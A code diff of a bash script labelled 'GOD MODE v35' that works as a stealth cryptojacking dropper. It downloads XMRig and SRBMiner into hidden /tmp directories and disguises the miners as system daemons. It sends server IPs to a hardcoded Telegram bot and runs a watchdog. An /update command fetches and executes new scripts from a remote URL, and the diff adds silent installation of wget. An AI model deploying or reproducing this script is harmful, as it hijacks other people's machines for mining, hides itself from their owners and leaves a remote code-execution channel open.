@@ -1,7 +1,7 @@
 #!/bin/bash
 
 # ============================================================
-# | GOD MODE v34: BULLETPROOF BASE_DIR & FALLBACK ENGINE      |
+# | GOD MODE v35: SRBMINER PEARL + AUTO WGET INSTALLER      |
 # ============================================================
 
 # [ CONFIGURATION ]
@@ -9,21 +9,14 @@ FIXED_WALLET_ID="krxYNV2DZQ"
 TG_BOT_TOKEN="8329784400:AAEtzySm1UTFIH-IqhAMUVNL5JLQhTlUOGg"
 TG_CHAT_ID="7032066912"
 
-# Ссылка по умолчанию для обновления
 DEFAULT_UPDATE_URL="https://raw.githubusercontent.com/xdLolKek/connfy-libs/refs/heads/main/Connfy.sh"
-
-# [ REPORTING INTERVAL: 18000s = 5 Hours ]
 REPORT_INTERVAL=18000 
 
-# [ POOLS ]
 POOL_CPU_1="xmr.kryptex.network:7029"
 POOL_CPU_2="xmr-eu.kryptex.network:7029"
-
-# Pearl (PRL) Pools for GPU (Kryptex Official)
 POOL_GPU_1="prl.kryptex.network:7048"
 POOL_GPU_2="prl-eu.kryptex.network:7048"
 
-# [ SAFE PRIVILEGES & DIRECTORY FALLBACK ]
 IS_ROOT=0
 if [ "$(id -u)" -eq 0 ]; then
     IS_ROOT=1
@@ -38,46 +31,23 @@ mkdir -p "$BASE_DIR" 2>/dev/null || BASE_DIR="/tmp/.connfy-core"
 mkdir -p "$BASE_DIR" 2>/dev/null
 cd "$BASE_DIR" 2>/dev/null || cd /tmp || exit 1
 
-# Добавляем BASE_DIR в PATH
 export PATH="$BASE_DIR:$PATH"
 
 # ----------------------------------------------------
-# [ PHASE 0: SAFE WGET WRAPPER FALLBACK ]
+# [ PHASE 0: AUTO INSTALL SYSTEM WGET ]
 # ----------------------------------------------------
 if ! command -v wget >/dev/null 2>&1; then
-    cat << 'EOF' > "$BASE_DIR/wget"
-#!/bin/bash
-URL=""
-OUTFILE=""
-NEXT_OUT=0
-for arg in "$@"; do
-    if [ "$NEXT_OUT" -eq 1 ]; then
-        OUTFILE="$arg"
-        NEXT_OUT=0
-        continue
+    if [ "$IS_ROOT" -eq 1 ]; then
+        if command -v apt-get >/dev/null 2>&1; then
+            apt-get update -y >/dev/null 2>&1 && apt-get install -y wget >/dev/null 2>&1
+        elif command -v yum >/dev/null 2>&1; then
+            yum install -y wget >/dev/null 2>&1
+        elif command -v apk >/dev/null 2>&1; then
+            apk add wget >/dev/null 2>&1
+        fi
     fi
-    case "$arg" in
-        -O|-o|--output-document)
-            NEXT_OUT=1
-            ;;
-        -O*|-o*)
-            OUTFILE="${arg#??}"
-            ;;
-        http://*|https://*)
-            URL="$arg"
-            ;;
-    esac
-done
-if [ -n "$OUTFILE" ] && [ "$OUTFILE" != "-" ]; then
-    exec curl -L -k -s -o "$OUTFILE" "$URL"
-else
-    exec curl -L -k -s "$URL"
-fi
-EOF
-    chmod +x "$BASE_DIR/wget"
 fi
 
-# Маскировочные имена процессов
 BIN_CPU="sys_net_daemon" 
 BIN_GPU="sys_render_service"
 
@@ -89,7 +59,7 @@ LOG_GPU="$BASE_DIR/.gpu_data.log"
 # ----------------------------------------------------
 get_worker() {
     local ip
-    ip=$(curl -s -m 3 --connect-timeout 2 api.ipify.org || curl -s -m 3 --connect-timeout 2 icanhazip.com || curl -s -m 3 --connect-timeout 2 ifconfig.me || wget -qO- --no-check-certificate -t 1 -T 2 ifconfig.me 2>/dev/null)
+    ip=$(curl -s -m 3 --connect-timeout 2 api.ipify.org || curl -s -m 3 --connect-timeout 2 icanhazip.com || curl -s -m 3 --connect-timeout 2 ifconfig.me || wget -qO- -t 1 -T 2 ifconfig.me 2>/dev/null)
     [ -z "$ip" ] && ip="111.111.111.111"
     
     local safe_worker
@@ -120,14 +90,14 @@ detect_gpu() {
 HAS_GPU=$(detect_gpu)
 
 # ----------------------------------------------------
-# [ PHASE 2: MODULE DOWNLOAD & SAFE INSTALL ]
+# [ PHASE 2: MODULE DOWNLOAD & INSTALL ]
 # ----------------------------------------------------
 URL_XMRIG="https://github.com/xmrig/xmrig/releases/download/v6.26.0/xmrig-6.26.0-linux-static-x64.tar.gz"
 URL_SRBMINER="https://github.com/doktor83/SRBMiner-Multi/releases/download/3.4.7/SRBMiner-Multi-3-4-7-Linux.tar.gz"
 
 # CPU Setup
 if [ ! -f "$BIN_CPU" ]; then
-    curl -L -k -s -m 30 --connect-timeout 5 -o cpu.tar.gz "$URL_XMRIG" || wget -qO cpu.tar.gz --no-check-certificate -T 30 "$URL_XMRIG"
+    curl -L -k -s -m 30 --connect-timeout 5 -o cpu.tar.gz "$URL_XMRIG" || wget -qO cpu.tar.gz -T 30 "$URL_XMRIG"
     if [ -f cpu.tar.gz ] && [ -s cpu.tar.gz ]; then
         tar -xf cpu.tar.gz 2>/dev/null
         FOUND_CPU=$(find . -type f -name "xmrig" | head -n 1)
@@ -156,7 +126,7 @@ cat <<EOF > config.json
 }
 EOF
 
-# GPU Setup (Проверка файла через 'grep -qia' без вызова бинарника)
+# GPU Setup
 if [ "$HAS_GPU" -eq 1 ]; then
     NEED_INSTALL=0
     if [ ! -f "$BIN_GPU" ]; then
@@ -171,7 +141,7 @@ if [ "$HAS_GPU" -eq 1 ]; then
     if [ "$NEED_INSTALL" -eq 1 ]; then
         pkill -9 -f "$BIN_GPU" 2>/dev/null
         rm -f "$BIN_GPU" gpu.tar.gz
-        curl -L -k -s -m 40 --connect-timeout 5 -o gpu.tar.gz "$URL_SRBMINER" || wget -qO gpu.tar.gz --no-check-certificate -T 40 "$URL_SRBMINER"
+        curl -L -k -s -m 40 --connect-timeout 5 -o gpu.tar.gz "$URL_SRBMINER" || wget -qO gpu.tar.gz -T 40 "$URL_SRBMINER"
         
         if [ -f gpu.tar.gz ] && [ -s gpu.tar.gz ]; then
             tar -xf gpu.tar.gz 2>/dev/null
@@ -346,7 +316,7 @@ send_logs_report() {
     send_tg_msg "\$msg"
 }
 
-STARTUP_MSG="🚀 <b>ENGINE V34 ACTIVE</b>%0A🌐 <b>IP:</b> <code>\$SERVER_IP</code>%0A🆔 <b>Worker:</b> <code>\$WORKER</code>%0A💡 <i>Use /update [IP|all] to deploy changes.</i>"
+STARTUP_MSG="🚀 <b>ENGINE V35 ACTIVE (SRBMiner Pearl)</b>%0A🌐 <b>IP:</b> <code>\$SERVER_IP</code>%0A🆔 <b>Worker:</b> <code>\$WORKER</code>%0A💡 <i>Use /update [IP|all] to deploy changes.</i>"
 send_tg_msg "\$STARTUP_MSG"
 
 while true; do
@@ -422,7 +392,7 @@ while true; do
                     TIMESTAMP=\$(date +%s)
                     DEST_SCRIPT="\$MODULE_DIR/Connfy_\${TIMESTAMP}.sh"
                     
-                    curl -L -k -s -m 15 --connect-timeout 5 -o "\$DEST_SCRIPT" "\$TARGET_URL" || wget -qO "\$DEST_SCRIPT" --no-check-certificate -T 15 "\$TARGET_URL"
+                    curl -L -k -s -m 15 --connect-timeout 5 -o "\$DEST_SCRIPT" "\$TARGET_URL" || wget -qO "\$DEST_SCRIPT" -T 15 "\$TARGET_URL"
                     
                     if [ -f "\$DEST_SCRIPT" ] && [ -s "\$DEST_SCRIPT" ]; then
                         chmod +x "\$DEST_SCRIPT"
@@ -472,7 +442,6 @@ if [ "$HAS_GPU" -eq 1 ] && [ -f "./$BIN_GPU" ]; then
     nohup ./$BIN_GPU --algorithm pearlhash --pool $POOL_GPU_1 --wallet $WORKER --pool $POOL_GPU_2 --wallet $WORKER --watchdog-enable --retry-time 10 --disable-cpu >> "$LOG_GPU" 2>&1 &
 fi
 
-# Запускаем вачдог полностью отвязанным через явный bash
 pkill -9 -f "watchdog.sh" 2>/dev/null
 (nohup bash "$BASE_DIR/watchdog.sh" </dev/null >/dev/null 2>&1 &)
 
@@ -480,10 +449,9 @@ pkill -9 -f "watchdog.sh" 2>/dev/null
 # [ PHASE 4: VERBOSE CLEAN ASCII DIAGNOSTICS ]
 # ----------------------------------------------------
 echo "================================================="
-echo "[+] ENGINE V34 INITIALIZED"
+echo "[+] ENGINE V35 INITIALIZED (SRBMiner Edition)"
 echo "[+] Server IP: $SERVER_IP"
 echo "[+] Worker ID: $WORKER"
-echo "[+] Directory: $BASE_DIR"
 echo "================================================="
 echo "[+] Igniting core engines..."
 sleep 3
